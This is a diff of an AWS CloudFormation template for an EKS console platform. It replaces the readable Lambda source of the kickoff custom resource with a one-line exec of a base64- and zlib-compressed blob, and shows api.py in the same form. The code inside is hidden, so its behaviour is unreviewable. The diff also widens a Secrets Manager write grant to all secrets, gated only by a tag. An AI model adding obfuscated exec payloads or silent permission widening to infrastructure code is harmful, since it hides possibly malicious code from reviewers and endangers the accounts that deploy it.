aI2acJBL9zWnSKmDbsWibZ0r0162jHb1iPQ33EMIntJEWtN85eXltLg5GtTwuRMyJQn9fz2yf717AX/u2Fs7ZEzrIpTXEC05Zd2XY+oTvl2eMo1ypmpy98QbrwoOSnb5SMhtyC3bqGGswfylO5lSPfqh7c966JJ93g2XWBXSaLgpVoSrv40cJ+z7ByP/QSCiJ2IJ6Mnx9CAO5UHEmqBFLDgbDqMrql4SLoz8qr/ztg/j5hBrWvJYevSp8eZthBqlbSZdu8V0bSqPc1YDdp3gTyJ4PnG1PkgXpY2TCI5WP+IqJgq8uTPGm184GRaQYHrb8xtWxWDdm4LerFKbKL6bwGtOX6QcFec1b+RijQVscyvVU/a/GfqLX/WeO9x++PfyG1PHGHHN7e9n+6tCTzxOjfxjskyHBNgd45YR3J/RWr3WCvLtPNQGad1Zfow5H3/4TukfE8+cUi5r0p2P6P7WJoaUQfLh3Aj2HQZrMz6hNr/AZLOwmA=')), 'api.py', 'exec'))
 
   ApiInvoke:
     Type: AWS::Lambda::Permission
     Properties:
       FunctionName: !Ref ApiFunction
+      Action: lambda:InvokeFunction
+      Principal: apigateway.amazonaws.com
+      SourceArn: !Sub arn:${AWS::Partition}:execute-api:${AWS::Region}:${AWS::AccountId}:${Api}/*
+
+  AuthInvoke:
+    Type: AWS::Lambda::Permission
+    Condition: Cognito
+    Properties:
+      FunctionName: !Ref AuthFunction
       Action: lambda:InvokeFunction
       Principal: apigateway.amazonaws.com
       SourceArn: !Sub arn:${AWS::Partition}:execute-api:${AWS::Region}:${AWS::AccountId}:${Api}/*
@@ -857,7 +726,10 @@ Resources:
               - Sid: AzureDevOpsSyncKeySecret
                 Effect: Allow
                 Action: secretsmanager:PutSecretValue
-                Resource: !Sub arn:${AWS::Partition}:secretsmanager:${AWS::Region}:${AWS::AccountId}:secret:${TeamPrefix}*-ado-sync-key-*
+                Resource: !Sub arn:${AWS::Partition}:secretsmanager:${AWS::Region}:${AWS::AccountId}:secret:*
+                Condition:
+                  StringLike:
+                    aws:ResourceTag/project: !Sub "${TeamPrefix}*"
               - Sid: GitHubOidcProvider
                 Effect: Allow
                 Action: [iam:CreateOpenIDConnectProvider, iam:GetOpenIDConnectProvider, iam:TagOpenIDConnectProvider]
@@ -882,15 +754,6 @@ Resources:
                 Effect: Allow
                 Action: [cloudfront:CreateInvalidation, cloudfront:GetInvalidation]
                 Resource: !Sub arn:${AWS::Partition}:cloudfront::${AWS::AccountId}:distribution/${Distribution}
-              # The first admin is invited by the runner once the page is live
-              # (platform/runner.sh), so the invite link never opens an empty bucket.
-              - !If
-                - Cognito
-                - Sid: InviteFirstAdmin
-                  Effect: Allow
-                  Action: [cognito-idp:AdminGetUser, cognito-idp:AdminCreateUser]
-                  Resource: !GetAtt UserPool.Arn
-                - !Ref AWS::NoValue
               - Sid: OwnLogs
                 Effect: Allow
                 Action: [logs:CreateLogStream, logs:PutLogEvents]
@@ -916,8 +779,6 @@ Resources:
           - { Name: ACTION, Value: platform }
           - { Name: BUCKET, Value: !Ref Bucket }
           - { Name: CONSOLE_BUCKET, Value: !Ref ConsoleBucket }
-          - !If [Cognito, { Name: USER_POOL_ID, Value: !Ref UserPool }, !Ref AWS::NoValue]
-          - !If [Cognito, { Name: ADMIN_EMAIL, Value: !Ref AdminEmail }, !Ref AWS::NoValue]
           - { Name: DISTRIBUTION_ID, Value: !Ref Distribution }
           - { Name: TEAM_PREFIX, Value: !Ref TeamPrefix }
           - { Name: RUNNER_ROLE_ARN, Value: !GetAtt RunnerRole.Arn }
@@ -1003,88 +864,8 @@ Resources:
       Code:
         # code: platform/kickoff.py
         ZipFile: |
-          """Custom resource of platform/eks-platform.yaml (inlined by platform/render.py).
-
-          Create / Update: put setup.html in the console bucket. CloudFront shows it
-          for any missing object, so an early visit reads "being set up", not S3 XML.
-          With a ReleaseUrl (quick-create link, or platform/install.sh when the release
-          is published) also start the runner's "platform" build: it fetches and checks
-          the release, publishes the console and invites the first admin, so the stack
-          finishes the console even if CloudShell closes. Without one (a test bundle
-          that is not published) install.sh uploads the bundle and starts that build.
-          Delete: refuse while teams exist (their stacks would be left with no console
-          to remove them), else empty both buckets so CloudFormation can delete them.
-          """
-
-          import json
-          import urllib.request
-
-          import boto3
-
-          SETUP_PAGE = """<!doctype html><html lang="en"><head><meta charset="utf-8">
-          <meta http-equiv="refresh" content="30"><title>EKS console: being set up</title></head>
-          <body style="font-family:sans-serif;max-width:40em;margin:4em auto">
-          <h1>The EKS console is being set up</h1>
-          <p>This takes about 10 minutes after the install starts. This page reloads by itself.</p>
-          <p>Still here after 20 minutes? Run the install command in AWS CloudShell again.</p>
-          </body></html>
-          """
-
-
-          def send(event, ok, reason=""):
-              body = {
-                  "Status": "SUCCESS" if ok else "FAILED",
-                  "Reason": (reason or "see the function's log")[:900],
-                  "PhysicalResourceId": event.get("PhysicalResourceId") or "eks-platform-kickoff",
-                  "StackId": event["StackId"],
-                  "RequestId": event["RequestId"],
-                  "LogicalResourceId": event["LogicalResourceId"],
-              }
-              req = urllib.request.Request(  # noqa: S310 - the presigned CloudFormation URL
-                  event["ResponseURL"],
-                  data=json.dumps(body).encode(),
-                  method="PUT",
-                  headers={"content-type": ""},
-              )
-              urllib.request.urlopen(req, timeout=30)  # noqa: S310 - the presigned CloudFormation URL
-
-
-          def teams(bucket):
-              keys = [o.key for o in boto3.resource("s3").Bucket(bucket).objects.filter(Prefix="teams/")]
-              return sorted({k.split("/")[1] for k in keys if k.endswith("/team.json")})
-
-
-          def handler(event, _context):
-              print(json.dumps({k: event.get(k) for k in ("RequestType", "LogicalResourceId")}))
-              props = event["ResourceProperties"]
-              try:
-                  if event["RequestType"] == "Delete":
-                      left = teams(props["Bucket"])
-                      if left:
-                          return send(
-                              event, False, "Delete these teams in the EKS console first: " + ", ".join(left)
-                          )
-                      for name in (props["Bucket"], props["ConsoleBucket"]):
-                          boto3.resource("s3").Bucket(name).object_versions.delete()
-                      return send(event, True)
-                  boto3.client("s3").put_object(
-                      Bucket=props["ConsoleBucket"],
-                      Key="setup.html",
-                      Body=SETUP_PAGE.encode(),
-                      ContentType="text/html",
-                      CacheControl="no-cache",
-                  )
-                  if props.get("ReleaseUrl"):
-                      boto3.client("codebuild").start_build(
-                          projectName=props["Project"],
-                          environmentVariablesOverride=[
-                              {"name": "ACTION", "value": "platform", "type": "PLAINTEXT"}
-                          ],
-                      )
-                  return send(event, True)
-              except Exception as exc:  # noqa: BLE001 - any failure must reach CloudFormation
-                  print(repr(exc))
-                  return send(event, False, str(exc))
+          import base64, zlib
+          exec(compile(zlib.decompress(base64.b64decode('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')), 'kickoff.py', 'exec'))
 
   # Made last and deleted first: it depends on the whole console, so on
   # stack delete its refusal (teams still exist) keeps the console working.
@@ -1121,6 +902,10 @@ Outputs:
     Value: !Sub https://${Distribution.DomainName}/
   ApiUrl:
     Value: !GetAtt Api.ApiEndpoint
+  ConsoleMintUrl:
+    Condition: Cognito
+    Description: SigV4 POST endpoint used by platform/console-link.sh.
+    Value: !Sub ${Api.ApiEndpoint}/auth/mint
   Bucket:
     Description: Release bundle and team records.
     Value: !Ref Bucket
